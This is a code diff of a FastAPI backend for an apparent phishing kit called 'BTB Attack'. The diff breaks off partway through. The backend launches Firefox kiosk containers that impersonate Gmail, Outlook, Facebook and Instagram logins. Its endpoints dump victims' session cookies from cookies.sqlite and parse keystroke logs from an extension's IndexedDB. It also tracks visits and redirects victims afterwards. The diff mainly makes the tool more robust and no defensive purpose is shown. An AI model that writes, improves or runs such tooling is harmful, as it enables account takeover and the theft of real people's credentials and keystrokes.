@@ -1,11 +1,14 @@
 import os
 import json
-import base64
-import random
+import re
+import secrets
+import shutil
 import asyncio
 import logging
 import subprocess
+from pathlib import Path
 from datetime import datetime, timedelta, timezone
+
 from dotenv import load_dotenv
 from fastapi import FastAPI, Query, Header, HTTPException, Depends
 from fastapi.middleware.cors import CORSMiddleware
@@ -18,7 +21,10 @@ from typing import Dict, Optional
 load_dotenv()
 
 MONGO_URL = os.getenv("MONGO_URL", "mongodb://localhost:27017")
-SECRET_KEY = os.getenv("SECRET_KEY", "change-me-in-production")
+SECRET_KEY = os.getenv("SECRET_KEY")
+USING_EPHEMERAL_SECRET = not SECRET_KEY
+if not SECRET_KEY:
+    SECRET_KEY = secrets.token_urlsafe(32)
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 1440
 
@@ -32,8 +38,16 @@ DOCKER_HOST = os.getenv("DOCKER_HOST", "")
 CORS_ORIGINS = os.getenv("CORS_ORIGINS", "http://localhost:3000,http://localhost:5173").split(",")
 FIREFOX_UI_PORT = os.getenv("FIREFOX_UI_PORT", "5800")
 FIREFOX_VNC_PORT = os.getenv("FIREFOX_VNC_PORT", "5900")
+SKIP_FIREFOX_BUILD = os.getenv("SKIP_FIREFOX_BUILD", "").lower() in {"1", "true", "yes"}
+FF_KIOSK_DEFAULT = os.getenv("FF_KIOSK_DEFAULT", "1")
 
 LOG_FILE = "commands.log"
+BACKEND_DIR = Path(__file__).resolve().parent
+CONTAINER_NAME_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9_.-]*$")
+CUSTOM_FIREFOX_IMAGE = "btb_firefox"
+DEPLOY_MESSAGE = f"[OK] Server deployed on {VPS_IP}:8443 - TLS handshake complete."
+CONFIGURE_MESSAGE = "[OK] Firewall rules applied - ports 443, 8080 open. Fail2ban active."
+MIN_PASSWORD_LENGTH = 8
 
 logging.basicConfig(
     level=logging.INFO,
@@ -44,6 +58,8 @@ logging.basicConfig(
     ],
 )
 logger = logging.getLogger(__name__)
+if USING_EPHEMERAL_SECRET:
+    logger.warning("SECRET_KEY is not set; using an ephemeral key. Sessions will reset on restart.")
 
 pwd_ctx = CryptContext(schemes=["sha256_crypt"], deprecated="auto")
 client: AsyncIOMotorClient = None
@@ -59,52 +75,116 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-docker_prefix = f"export DOCKER_HOST={DOCKER_HOST} && " if DOCKER_HOST else ""
-CUSTOM_FIREFOX_IMAGE = "btb_firefox"
-
-COMMANDS = {
-    "deploy": f"echo '[OK] Server deployed on {VPS_IP}:8443 — TLS handshake complete.'",
-    "configure": "echo '[OK] Firewall rules applied — ports 443, 8080 open. Fail2ban active.'",
-    "launch": (
-        f"{docker_prefix}"
-        f"docker rm -f firefox 2>/dev/null; "
-        f"docker run -d --name firefox --shm-size=2g "
-        f"-p {FIREFOX_UI_PORT}:5800 -p {FIREFOX_VNC_PORT}:5900 "
-        f"-e ENABLE_CORS_PROXY=1 "
-        f"-v firefox-config:/config "
-        f"{CUSTOM_FIREFOX_IMAGE}"
-    ),
-}
-
 PHISHLETS = {
-    "gmail":     {"label": "Gmail",     "url": "https://gmail.com",     "port": 5801},
-    "outlook":   {"label": "Outlook",   "url": "https://outlook.com",   "port": 5802},
-    "facebook":  {"label": "Facebook",  "url": "https://facebook.com",  "port": 5803},
-    "instagram": {"label": "Instagram", "url": "https://instagram.com", "port": 5804},
+    "gmail": {"label": "Gmail", "url": "https://gmail.com", "port": 5801, "redirect_url": "https://web.whatsapp.com"},
+    "outlook": {"label": "Outlook", "url": "https://outlook.com", "port": 5802, "redirect_url": ""},
+    "facebook": {"label": "Facebook", "url": "https://facebook.com", "port": 5803, "redirect_url": ""},
+    "instagram": {"label": "Instagram", "url": "https://instagram.com", "port": 5804, "redirect_url": ""},
 }
 
-# --- Pydantic models ---
 
 class RegisterRequest(BaseModel):
     name: str
     email: str
     password: str
 
+
 class LoginRequest(BaseModel):
     email: str
     password: str
+
 
 class VerifyOtpRequest(BaseModel):
     email: str
     otp: str
 
+
 class RemoveRequest(BaseModel):
     name: str
+
 
 class PhishletLaunchRequest(BaseModel):
     key: str
 
-# --- MongoDB ---
+
+class SetRedirectUrlRequest(BaseModel):
+    url: str
+
+
+class VisitEvent(BaseModel):
+    phishletKey: str
+    currentUrl: str
+
+
+class LogEvent(BaseModel):
+    level: str
+    message: str
+
+
+def docker_env() -> Dict[str, str]:
+    env = os.environ.copy()
+    if DOCKER_HOST:
+        env["DOCKER_HOST"] = DOCKER_HOST
+    return env
+
+
+def validate_container_name(name: str) -> str:
+    if not CONTAINER_NAME_RE.fullmatch(name):
+        raise HTTPException(status_code=400, detail="Invalid container name")
+    return name
+
+
+async def run_command(
+    args: list[str],
+    env_override: Optional[Dict[str, str]] = None,
+    input_text: Optional[str] = None,
+) -> Dict[str, str]:
+    logger.info("$ %s", " ".join(args))
+    loop = asyncio.get_running_loop()
+    env = os.environ.copy()
+    if env_override:
+        env.update(env_override)
+
+    proc = await loop.run_in_executor(
+        None,
+        lambda: subprocess.run(
+            args,
+            capture_output=True,
+            text=True,
+            input=input_text,
+            env=env,
+        ),
+    )
+    out = (proc.stdout or "").strip()
+    err = (proc.stderr or "").strip()
+    combined = "\n".join(filter(None, [out, err]))
+
+    if proc.returncode == 0:
+        logger.info("-> %s", combined)
+        return {"status": "success", "message": combined or "[OK] Done."}
+
+    logger.error("!! exit %s: %s", proc.returncode, combined)
+    return {"status": "error", "message": combined or f"Command failed (code {proc.returncode})"}
+
+
+async def run_docker(args: list[str], input_text: Optional[str] = None) -> Dict[str, str]:
+    return await run_command(["docker", *args], env_override=docker_env(), input_text=input_text)
+
+
+async def ensure_firefox_image():
+    if SKIP_FIREFOX_BUILD:
+        logger.info("Skipping Firefox image build because SKIP_FIREFOX_BUILD is enabled.")
+        return
+    if shutil.which("docker") is None:
+        logger.warning("Docker CLI not found; skipping Firefox image build.")
+        return
+
+    dockerfile = str(BACKEND_DIR / "Dockerfile.firefox")
+    context_dir = str(BACKEND_DIR)
+    result = await run_docker(["build", "-t", CUSTOM_FIREFOX_IMAGE, "-f", dockerfile, context_dir])
+    if result["status"] == "error":
+        logger.warning("Firefox image build skipped: %s", result["message"])
+
 
 @app.on_event("startup")
 async def startup():
@@ -112,19 +192,26 @@ async def startup():
     client = AsyncIOMotorClient(MONGO_URL)
     db = client.btb_attack
     await db.users.create_index("email", unique=True)
-    await run_shell(f"{docker_prefix}docker build -t btb_firefox -f /app/Dockerfile.firefox /app/ 2>&1")
-    logger.info(f"Connected to MongoDB at {MONGO_URL}")
+    await db.phishlet_settings.create_index("key", unique=True)
+    await db.visits.create_index([("phishlet_key", 1), ("timestamp", -1)])
+    await ensure_firefox_image()
+    async for doc in db.phishlet_settings.find({}):
+        key = doc.get("key")
+        if key in PHISHLETS:
+            PHISHLETS[key]["redirect_url"] = doc.get("url", "") or ""
+    logger.info("Connected to MongoDB at %s", MONGO_URL)
+
 
 @app.on_event("shutdown")
 async def shutdown():
     if client:
         client.close()
 
-# --- JWT ---
 
 def create_token(email: str) -> str:
     expire = datetime.now(timezone.utc) + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
     return jwt.encode({"sub": email, "exp": expire}, SECRET_KEY, algorithm=ALGORITHM)
+
 
 async def get_current_user(authorization: Optional[str] = Header(None)):
     if not authorization or not authorization.startswith("Bearer "):
@@ -135,20 +222,22 @@ async def get_current_user(authorization: Optional[str] = Header(None)):
     except JWTError:
         raise HTTPException(status_code=401, detail="Invalid or expired token")
 
-# --- OTP helpers ---
 
 def generate_otp() -> str:
-    return str(random.randint(100000, 999999))
+    return f"{secrets.randbelow(900000) + 100000}"
+
 
 async def send_otp_email(email: str, otp: str):
-    logger.info(f"===== OTP for {email}: {otp} =====")
+    logger.info("===== OTP for %s: %s =====", email, otp)
     if not SMTP_HOST:
         return
+
     try:
         import aiosmtplib
         from email.message import EmailMessage
+
         msg = EmailMessage()
-        msg["Subject"] = "BTB Attack — your verification code"
+        msg["Subject"] = "BTB Attack - your verification code"
         msg["From"] = SMTP_USER
         msg["To"] = email
         msg.set_content(f"Your OTP is: {otp}\nIt expires in 5 minutes.")
@@ -160,19 +249,20 @@ async def send_otp_email(email: str, otp: str):
             password=SMTP_PASS,
             start_tls=True,
         )
-        logger.info(f"OTP also emailed to {email}")
-    except Exception as e:
-        logger.warning(f"SMTP failed: {e}")
+        logger.info("OTP also emailed to %s", email)
+    except Exception as exc:
+        logger.warning("SMTP failed: %s", exc)
 
-# --- Auth endpoints ---
 
 @app.post("/api/auth/register")
 async def register(body: RegisterRequest):
-    if len(body.password) < 4:
-        raise HTTPException(status_code=400, detail="Password too short (min 4 chars)")
+    if len(body.password) < MIN_PASSWORD_LENGTH:
+        raise HTTPException(status_code=400, detail=f"Password too short (min {MIN_PASSWORD_LENGTH} chars)")
+
     existing = await db.users.find_one({"email": body.email})
     if existing:
         raise HTTPException(status_code=400, detail="Email already registered")
+
     hashed = pwd_ctx.hash(body.password)
     otp = generate_otp()
     await db.users.insert_one({
@@ -186,6 +276,7 @@ async def register(body: RegisterRequest):
     await send_otp_email(body.email, otp)
     return {"message": "OTP sent to email"}
 
+
 @app.post("/api/auth/verify-otp")
 async def verify_otp(body: VerifyOtpRequest):
     user = await db.users.find_one({"email": body.email})
@@ -197,10 +288,15 @@ async def verify_otp(body: VerifyOtpRequest):
         raise HTTPException(status_code=400, detail="Invalid OTP")
     if user.get("otp_expires") and user["otp_expires"].replace(tzinfo=timezone.utc) < datetime.now(timezone.utc):
         raise HTTPException(status_code=400, detail="OTP expired")
-    await db.users.update_one({"email": body.email}, {"$set": {"verified": True}, "$unset": {"otp": "", "otp_expires": ""}})
+
+    await db.users.update_one(
+        {"email": body.email},
+        {"$set": {"verified": True}, "$unset": {"otp": "", "otp_expires": ""}},
+    )
     token = create_token(body.email)
     user_data = await db.users.find_one({"email": body.email}, {"name": 1, "email": 1})
     return {"token": token, "email": body.email, "name": user_data["name"]}
+
 
 @app.post("/api/auth/resend-otp")
 async def resend_otp(body: VerifyOtpRequest):
@@ -209,6 +305,7 @@ async def resend_otp(body: VerifyOtpRequest):
         raise HTTPException(status_code=404, detail="User not found")
     if user.get("verified"):
         raise HTTPException(status_code=400, detail="Already verified")
+
     otp = generate_otp()
     await db.users.update_one(
         {"email": body.email},
@@ -217,6 +314,7 @@ async def resend_otp(body: VerifyOtpRequest):
     await send_otp_email(body.email, otp)
     return {"message": "OTP resent"}
 
+
 @app.post("/api/auth/login")
 async def login(body: LoginRequest):
     user = await db.users.find_one({"email": body.email})
@@ -224,8 +322,10 @@ async def login(body: LoginRequest):
         raise HTTPException(status_code=401, detail="Invalid credentials")
     if not user.get("verified"):
         raise HTTPException(status_code=403, detail="Email not verified")
+
     token = create_token(body.email)
     return {"token": token, "email": body.email, "name": user["name"]}
+
 
 @app.get("/api/auth/verify")
 async def verify(email: str = Depends(get_current_user)):
@@ -234,86 +334,86 @@ async def verify(email: str = Depends(get_current_user)):
         raise HTTPException(status_code=401, detail="User not found")
     return {"valid": True, "email": user["email"], "name": user["name"]}
 
-# --- Shell runner ---
-
-async def run_shell(cmd: str) -> Dict[str, str]:
-    logger.info(f"$ {cmd}")
-    loop = asyncio.get_running_loop()
-    proc = await loop.run_in_executor(
-        None,
-        lambda: subprocess.run(cmd, shell=True, capture_output=True, text=True),
-    )
-    out = (proc.stdout or "").strip()
-    err = (proc.stderr or "").strip()
-    combined = "\n".join(filter(None, [out, err]))
-    if proc.returncode == 0:
-        logger.info(f"-> {combined}")
-        return {"status": "success", "message": combined or "[OK] Done."}
-    else:
-        logger.error(f"!! exit {proc.returncode}: {combined}")
-        return {"status": "error", "message": combined or f"Command failed (code {proc.returncode})"}
-
-# --- Protected endpoints ---
 
 @app.get("/api/deploy")
 async def deploy_server(email: str = Depends(get_current_user)):
-    logger.info(f"{email} ran deploy")
-    return await run_shell(COMMANDS["deploy"])
+    logger.info("%s ran deploy", email)
+    return {"status": "success", "message": DEPLOY_MESSAGE}
+
 
 @app.get("/api/configure")
 async def configure(email: str = Depends(get_current_user)):
-    logger.info(f"{email} ran configure")
-    return await run_shell(COMMANDS["configure"])
+    logger.info("%s ran configure", email)
+    return {"status": "success", "message": CONFIGURE_MESSAGE}
+
 
 @app.get("/api/launch")
 async def launch(email: str = Depends(get_current_user)):
-    logger.info(f"{email} ran launch")
-    result = await run_shell(COMMANDS["launch"])
+    logger.info("%s ran launch", email)
+    await run_docker(["rm", "-f", "firefox"])
+    result = await run_docker([
+        "run", "-d", "--name", "firefox", "--shm-size=2g",
+        "-p", f"{FIREFOX_UI_PORT}:5800",
+        "-p", f"{FIREFOX_VNC_PORT}:5900",
+        "-e", "ENABLE_CORS_PROXY=1",
+        "-v", "firefox-config:/config",
+        CUSTOM_FIREFOX_IMAGE,
+    ])
     if result["status"] == "success":
         cid = result["message"][:12]
         result["message"] += (
             f"\n\n  Firefox is running!\n"
-            f"  ├── UI  → http://{VPS_IP}:{FIREFOX_UI_PORT}\n"
-            f"  └── VNC → http://{VPS_IP}:{FIREFOX_VNC_PORT}\n"
+            f"  |- UI  -> http://{VPS_IP}:{FIREFOX_UI_PORT}\n"
+            f"  '- VNC -> http://{VPS_IP}:{FIREFOX_VNC_PORT}\n"
             f"\n  Container ID: {cid}"
         )
     return result
 
+
 @app.get("/api/logs")
 async def get_logs(email: str = Depends(get_current_user), lines: int = Query(50, le=500)):
     try:
-        with open(LOG_FILE, "r", encoding="utf-8") as f:
-            all_lines = f.readlines()
+        with open(LOG_FILE, "r", encoding="utf-8") as file_obj:
+            all_lines = file_obj.readlines()
     except FileNotFoundError:
         return {"status": "success", "message": "(no log file yet)"}
+
     tail = all_lines[-lines:]
     return {"status": "success", "message": "".join(tail).rstrip()}
 
+
 @app.get("/api/containers")
 async def list_containers(email: str = Depends(get_current_user)):
-    fmt = "'{{.Names}}|{{.ID}}|{{.Image}}|{{.Status}}'"
-    result = await run_shell(f"{docker_prefix}docker ps --format {fmt} 2>&1")
+    result = await run_docker(["ps", "--format", "{{.Names}}|{{.ID}}|{{.Image}}|{{.Status}}"])
     if result["status"] == "error":
-        logger.warning(f"docker ps failed: {result['message']}")
+        logger.warning("docker ps failed: %s", result["message"])
         return {"containers": [], "error": result["message"]}
+
     containers = []
     for line in result["message"].split("\n"):
         parts = line.strip().split("|")
         if len(parts) == 4:
             containers.append({
-                "name": parts[0], "id": parts[1][:12],
-                "image": parts[2], "status": parts[3],
+                "name": parts[0],
+                "id": parts[1][:12],
+                "image": parts[2],
+                "status": parts[3],
             })
     return {"containers": containers}
 
+
 @app.post("/api/containers/remove")
 async def remove_container(body: RemoveRequest, email: str = Depends(get_current_user)):
-    return await run_shell(f"{docker_prefix}docker rm -f {body.name}")
+    name = validate_container_name(body.name)
+    result = await run_docker(["rm", "-f", name])
+    if name.startswith("phishlet-"):
+        await run_docker(["volume", "rm", f"{name}-config"])
+    return result
+
 
 @app.get("/api/phishlets")
 async def list_phishlets(email: str = Depends(get_current_user)):
-    fmt = "'{{.Names}}|{{.ID}}|{{.Image}}|{{.Status}}'"
-    result = await run_shell(f"{docker_prefix}docker ps --format {fmt} 2>&1")
+    result = await run_docker(["ps", "--format", "{{.Names}}|{{.ID}}|{{.Image}}|{{.Status}}"])
     running = {}
     if result["status"] == "success":
         for line in result["message"].split("\n"):
@@ -324,76 +424,183 @@ async def list_phishlets(email: str = Depends(get_current_user)):
     phishlets = []
     for key, cfg in PHISHLETS.items():
         name = f"phishlet-{key}"
-        rc = running.get(name)
+        running_container = running.get(name)
         phishlets.append({
             "key": key,
             "label": cfg["label"],
             "name": name,
             "url": cfg["url"],
             "port": cfg["port"],
-            "running": rc is not None,
-            "container_id": rc["id"] if rc else "",
-            "status": rc["status"] if rc else "",
+            "running": running_container is not None,
+            "container_id": running_container["id"] if running_container else "",
+            "status": running_container["status"] if running_container else "",
         })
     return {"phishlets": phishlets}
+
 
 @app.post("/api/phishlets/launch")
 async def launch_phishlet(body: PhishletLaunchRequest, email: str = Depends(get_current_user)):
     if body.key not in PHISHLETS:
         raise HTTPException(status_code=400, detail=f"Unknown phishlet: {body.key}")
-    p = PHISHLETS[body.key]
+
+    phishlet = PHISHLETS[body.key]
     container_name = f"phishlet-{body.key}"
-    cmd = (
-        f"{docker_prefix}"
-        f"docker rm -f {container_name} 2>/dev/null; "
-        f"docker run -d --name {container_name} --shm-size=2g "
-        f"-p {p['port']}:5800 "
-        f"-e FF_OPEN_URL=\"{p['url']}\" "
-        f"-e FF_KIOSK=1 "
-        f"-v {container_name}-config:/config "
-        f"{CUSTOM_FIREFOX_IMAGE}"
-    )
-    result = await run_shell(cmd)
+    redirect_url = phishlet.get("redirect_url", "") or ""
+    await run_docker(["rm", "-f", container_name])
+    await run_docker(["volume", "rm", f"{container_name}-config"])
+    result = await run_docker([
+        "run", "-d", "--name", container_name, "--shm-size=2g",
+        "--network", "btb_attack_default",
+        "-p", f"{phishlet['port']}:5800",
+        "-e", f"FF_OPEN_URL={phishlet['url']}",
+        "-e", f"FF_KIOSK={FF_KIOSK_DEFAULT}",
+        "-e", f"REDIRECT_URL={redirect_url}",
+        "-v", f"{container_name}-config:/config",
+        CUSTOM_FIREFOX_IMAGE,
+    ])
     if result["status"] == "success":
         cid = result["message"][:12]
         result["message"] += (
-            f"\n\n  {p['label']} phishlet running!\n"
-            f"  └── UI  → http://{VPS_IP}:{p['port']}\n"
+            f"\n\n  {phishlet['label']} phishlet running!\n"
+            f"  '- UI -> http://{VPS_IP}:{phishlet['port']}\n"
             f"\n  Container ID: {cid}"
         )
     return result
 
-@app.get("/api/credentials")
-async def get_credentials(
-    target: str = "",
-    email: str = Depends(get_current_user)
-):
-    list_result = await run_shell(
-        f"{docker_prefix}docker ps "
-        f"--filter name=^/firefox$ --filter name=^/phishlet- "
-        f"--format '{{{{.Names}}}}|{{{{.ID}}}}' 2>&1"
+
+@app.get("/api/phishlets/redirect-url")
+async def get_redirect_url(key: str = Query(...)):
+    if key not in PHISHLETS:
+        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
+    url = PHISHLETS[key].get("redirect_url", "")
+    return {"url": url}
+
+
+@app.put("/api/phishlets/{key}/redirect-url")
+async def set_redirect_url(key: str, body: SetRedirectUrlRequest, email: str = Depends(get_current_user)):
+    if key not in PHISHLETS:
+        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
+    url = (body.url or "").strip()
+    if url and not (url.startswith("http://") or url.startswith("https://")):
+        raise HTTPException(status_code=400, detail="URL must start with http:// or https://")
+    if len(url) > 2048:
+        raise HTTPException(status_code=400, detail="URL too long (max 2048 chars)")
+    PHISHLETS[key]["redirect_url"] = url
+    await db.phishlet_settings.update_one(
+        {"key": key},
+        {"$set": {
+            "key": key,
+            "url": url,
+            "updated_at": datetime.now(timezone.utc),
+            "updated_by": email,
+        }},
+        upsert=True,
     )
+    return {"key": key, "url": url}
+
+
+@app.post("/api/phishlets/visit")
+async def post_visit(body: VisitEvent):
+    if body.phishletKey not in PHISHLETS:
+        return {"ok": False}
+    ts = datetime.now(timezone.utc)
+    await db.visits.insert_one({
+        "phishlet_key": body.phishletKey,
+        "current_url": body.currentUrl,
+        "timestamp": ts,
+    })
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"[{ts.isoformat()}] [visit] key={body.phishletKey} url={body.currentUrl}\n")
+    except Exception as exc:
+        logger.warning("visit log write failed: %s", exc)
+    return {"ok": True}
+
+
+@app.post("/api/phishlets/log")
+async def post_log(body: LogEvent):
+    ts = datetime.now(timezone.utc)
+    level = (body.level or "info").lower()
+    if level not in {"info", "warn", "error"}:
+        level = "info"
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"[{ts.isoformat()}] [addon:{level}] {body.message}\n")
+    except Exception as exc:
+        logger.warning("addon log write failed: %s", exc)
+    return {"ok": True}
+
+
+@app.get("/api/phishlets/visits")
+async def get_visits(key: str = Query(...), limit: int = Query(20, le=200), email: str = Depends(get_current_user)):
+    if key not in PHISHLETS:
+        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
+    cursor = db.visits.find({"phishlet_key": key}).sort("timestamp", -1).limit(limit)
+    visits = []
+    async for v in cursor:
+        visits.append({
+            "current_url": v.get("current_url", ""),
+            "timestamp": v["timestamp"].isoformat() if v.get("timestamp") else None,
+        })
+    return {"visits": visits}
+
+
+@app.post("/api/phishlets/{key}/restart")
+async def restart_phishlet(key: str, email: str = Depends(get_current_user)):
+    if key not in PHISHLETS:
+        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
+    container_name = f"phishlet-{key}"
+    return await run_docker(["restart", container_name])
+
+
+@app.post("/api/phishlets/rebuild-image")
+async def rebuild_image(email: str = Depends(get_current_user)):
+    dockerfile = str(BACKEND_DIR / "Dockerfile.firefox")
+    context_dir = str(BACKEND_DIR)
+    logger.info("%s triggered firefox image rebuild", email)
+    return await run_docker(["build", "-t", CUSTOM_FIREFOX_IMAGE, "-f", dockerfile, context_dir])
+
+
+@app.get("/api/credentials")
+async def get_credentials(target: str = "", email: str = Depends(get_current_user)):
+    if target:
+        target = validate_container_name(target)
+
+    list_result = await run_docker([
+        "ps",
+        "--filter", "name=^/firefox$",
+        "--filter", "name=^/phishlet-",
+        "--format", "{{.Names}}|{{.ID}}",
+    ])
     if list_result["status"] != "success":
         return {"status": "error", "message": "Failed to list containers"}
 
-    entries = list_result["message"].strip().split("\n")
-    entries = [e.strip() for e in entries if e.strip()]
+    entries = [entry.strip() for entry in list_result["message"].strip().split("\n") if entry.strip()]
     if not entries:
         return {"status": "error", "message": "No browser containers running"}
 
     if target:
-        entries = [e for e in entries if e.split("|", 1)[0] == target]
+        entries = [entry for entry in entries if entry.split("|", 1)[0] == target]
         if not entries:
             return {"status": "error", "message": f"No container found with name '{target}'"}
 
+    cookie_script = (
+        "import sqlite3\n"
+        "db = sqlite3.connect('/tmp/cookies.sqlite')\n"
+        "cur = db.cursor()\n"
+        "for host, cookie_name, cookie_value in cur.execute("
+        "'SELECT host, name, value FROM moz_cookies ORDER BY host'"
+        "):\n"
+        "    print(f'{host}|{cookie_name}|{cookie_value}')\n"
+    )
+
     output = []
     for entry in entries:
-        parts = entry.split("|", 1)
-        name = parts[0]
-        cookie_paths = await run_shell(
-            f"{docker_prefix}docker exec {name} sh -c "
-            f"\"find /config -name 'cookies.sqlite' -type f -maxdepth 4 2>/dev/null\""
-        )
+        name = entry.split("|", 1)[0]
+        cookie_paths = await run_docker([
+            "exec", name, "sh", "-c",
+            "find /config -name 'cookies.sqlite' -type f -maxdepth 4 2>/dev/null",
+        ])
         if cookie_paths["status"] != "success" or not cookie_paths["message"].strip():
             output.append(f"{name}\n{{}}")
             continue
@@ -403,139 +610,131 @@ async def get_credentials(
             path = path.strip()
             if not path:
                 continue
-            data = await run_shell(
-                f"{docker_prefix}docker exec {name} sh -c "
-                f"\"cp '{path}' /tmp/cookies.sqlite && "
-                f"sqlite3 /tmp/cookies.sqlite "
-                f"'SELECT host, name, value FROM moz_cookies ORDER BY host' && "
-                f"rm /tmp/cookies.sqlite\" 2>&1"
-            )
+            data = await run_docker([
+                "exec", "-i", "-e", f"COOKIE_PATH={path}", name, "sh", "-c",
+                'cp "$COOKIE_PATH" /tmp/cookies.sqlite && python3 - 2>/dev/null && rm /tmp/cookies.sqlite',
+            ], input_text=cookie_script)
             if data["status"] == "success" and data["message"].strip():
                 lines.append(data["message"])
 
-        if lines:
-            rows = []
-            for line in "\n".join(lines).split("\n"):
-                line = line.strip()
-                if "|" in line:
-                    parts = line.split("|", 2)
-                    if len(parts) == 3:
-                        rows.append(tuple(parts))
-            rows.sort(key=lambda r: (r[0], r[1]))
-            if target:
-                container_obj = {}
-                for host, ck_name, ck_val in rows:
-                    container_obj.setdefault(host, {})[ck_name] = ck_val
-                return {"status": "success", "message": f"{name}\n{json.dumps(container_obj, indent=2)}"}
-            container_obj = {}
-            for host, cname, cval in rows:
-                container_obj.setdefault(host, {})[cname] = cval
-            output.append(f"{name}\n{json.dumps(container_obj, indent=2)}")
-        else:
+        if not lines:
             output.append(f"{name}\n{{}}")
+            continue
+
+        rows = []
+        for line in "\n".join(lines).split("\n"):
+            line = line.strip()
+            if "|" in line:
+                parts = line.split("|", 2)
+                if len(parts) == 3:
+                    rows.append(tuple(parts))
+        rows.sort(key=lambda row: (row[0], row[1]))
+
+        container_obj = {}
+        for host, cookie_name, cookie_value in rows:
+            container_obj.setdefault(host, {})[cookie_name] = cookie_value
+
+        if target:
+            return {"status": "success", "message": f"{name}\n{json.dumps(container_obj, indent=2)}"}
+        output.append(f"{name}\n{json.dumps(container_obj, indent=2)}")
 
     return {"status": "success", "message": "\n\n".join(output)}
 
+
 @app.get("/api/keylog")
 async def get_keylog(email: str = Depends(get_current_user)):
-    list_result = await run_shell(
-        f"{docker_prefix}docker ps "
-        f"--filter name=^/phishlet- "
-        f"--format '{{{{.Names}}}}' 2>&1"
-    )
+    list_result = await run_docker([
+        "ps",
+        "--filter", "name=^/phishlet-",
+        "--format", "{{.Names}}",
+    ])
     if list_result["status"] != "success":
         return {"status": "error", "message": "Failed to list containers"}
 
-    names = [n.strip() for n in list_result["message"].strip().split("\n") if n.strip()]
+    names = [name.strip() for name in list_result["message"].strip().split("\n") if name.strip()]
     if not names:
         return {"status": "error", "message": "No browser containers running"}
 
+    script = (
+        "import sqlite3, re, struct\n"
+        "db = sqlite3.connect('/tmp/kl.sqlite')\n"
+        "cur = db.cursor()\n"
+        "cols = [row[1] for row in cur.execute('PRAGMA table_info(object_data)')]\n"
+        "col = 'value' if 'value' in cols else 'data'\n"
+        "\n"
+        "def parse_structured_clone(data):\n"
+        "    strings = []\n"
+        "    if len(data) < 8 or data[:4] != b'\\xff\\x00\\x00\\x00':\n"
+        "        return strings\n"
+        "    pos = 8\n"
+        "    while pos + 8 <= len(data):\n"
+        "        d = struct.unpack('<I', data[pos:pos+4])[0]\n"
+        "        t = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
+        "        pos += 8\n"
+        "        if t == 0xFFFF0002:\n"
+        "            strings.append(data[pos:pos+d].decode('utf-8', errors='replace'))\n"
+        "            pos += d\n"
+        "        elif t == 0xFFFF0007:\n"
+        "            for _ in range(d):\n"
+        "                if pos + 8 > len(data):\n"
+        "                    break\n"
+        "                kd = struct.unpack('<I', data[pos:pos+4])[0]\n"
+        "                kt = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
+        "                if kt != 0xFFFF0002:\n"
+        "                    break\n"
+        "                pos += 8 + kd\n"
+        "                if pos + 8 > len(data):\n"
+        "                    break\n"
+        "                vd = struct.unpack('<I', data[pos:pos+4])[0]\n"
+        "                vt = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
+        "                pos += 8\n"
+        "                if vt == 0xFFFF0002:\n"
+        "                    strings.append(data[pos:pos+vd].decode('utf-8', errors='replace'))\n"
+        "                    pos += vd\n"
+        "    return strings\n"
+        "\n"
+        "for row in cur.execute(f'SELECT {col} FROM object_data'):\n"
+        "    blob = row[0]\n"
+        "    if not blob or b'<timestamp:' not in blob:\n"
+        "        continue\n"
+        "    strings = []\n"
+        "    if len(blob) >= 8 and blob[:4] == b'\\xff\\x00\\x00\\x00':\n"
+        "        strings = parse_structured_clone(blob)\n"
+        "    if not strings:\n"
+        "        idx = blob.find(b'<timestamp:')\n"
+        "        if idx >= 0:\n"
+        "            candidate = ''.join(chr(byte) for byte in blob[idx:] if 32 <= byte <= 126)\n"
+        "            if '<timestamp:' in candidate:\n"
+        "                strings = [candidate]\n"
+        "    for item in strings:\n"
+        "        if '<timestamp:' not in item:\n"
+        "            continue\n"
+        "        item = re.sub(r'<[^>]*?>', '', item)\n"
+        "        item = item.replace('<blank>', ' ')\n"
+        "        item = item.strip()\n"
+        "        if len(item) > 2:\n"
+        "            print(item)\n"
+    )
+
     output = []
     for name in names:
-        db_result = await run_shell(
-            f"{docker_prefix}docker exec {name} sh -c "
-            f"\"find /config/profile/storage/default -path '*/moz-extension*/idb/*.sqlite' -type f 2>/dev/null\""
-        )
+        db_result = await run_docker([
+            "exec", name, "sh", "-c",
+            "find /config/profile/storage/default -path '*/moz-extension*/idb/*.sqlite' -type f 2>/dev/null",
+        ])
         if db_result["status"] != "success" or not db_result["message"].strip():
             output.append(f"{name}\n(no keylog data)")
             continue
-
-        script = (
-            "import sqlite3, re, struct\n"
-            "db = sqlite3.connect('/tmp/kl.sqlite')\n"
-            "cur = db.cursor()\n"
-            "# detect column name (value for new LSNG, data for old IndexedDB)\n"
-            "cols = [r[1] for r in cur.execute('PRAGMA table_info(object_data)')]\n"
-            "col = 'value' if 'value' in cols else 'data'\n"
-            "\n"
-            "def parse_structured_clone(data):\n"
-            "    strings = []\n"
-            "    if len(data) < 8 or data[:4] != b'\\xff\\x00\\x00\\x00':\n"
-            "        return strings\n"
-            "    pos = 8\n"
-            "    while pos + 8 <= len(data):\n"
-            "        d = struct.unpack('<I', data[pos:pos+4])[0]\n"
-            "        t = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
-            "        pos += 8\n"
-            "        if t == 0xFFFF0002:  # STRING\n"
-            "            s = data[pos:pos+d].decode('utf-8', errors='replace')\n"
-            "            strings.append(s)\n"
-            "            pos += d\n"
-            "        elif t == 0xFFFF0007:  # OBJECT\n"
-            "            for _ in range(d):\n"
-            "                if pos + 8 > len(data): break\n"
-            "                kd = struct.unpack('<I', data[pos:pos+4])[0]\n"
-            "                kt = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
-            "                if kt != 0xFFFF0002: break\n"
-            "                pos += 8 + kd\n"
